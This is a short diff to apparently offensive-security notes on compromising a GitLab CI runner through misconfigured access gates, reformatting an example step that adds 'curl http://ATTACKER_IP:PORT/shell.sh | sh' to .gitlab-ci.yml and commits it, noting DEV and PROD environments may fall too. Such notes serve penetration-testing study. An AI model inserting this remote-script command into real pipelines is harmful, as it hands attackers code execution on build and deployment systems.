@@ -1,10 +1,16 @@
+# Gitlab runner compromise
+
 ## TIP: Depending on the context the runner is running, you may even compromise DEV and PROD environments respectively.
 
 # MISCONFIGURED ACCESS GATES
 
 ## EXAMPLE:
 
-#### 1) Update the .gitlab-ci.yml file with "curl http://ATTACKER_IP:PORT/shell.sh | sh" on the script paragraph.
+#### 1) Update the .gitlab-ci.yml file with 
+
+    "curl http://ATTACKER_IP:PORT/shell.sh | sh" 
+    
+#### on the script paragraph.
 
 #### 2) Commit changes
 
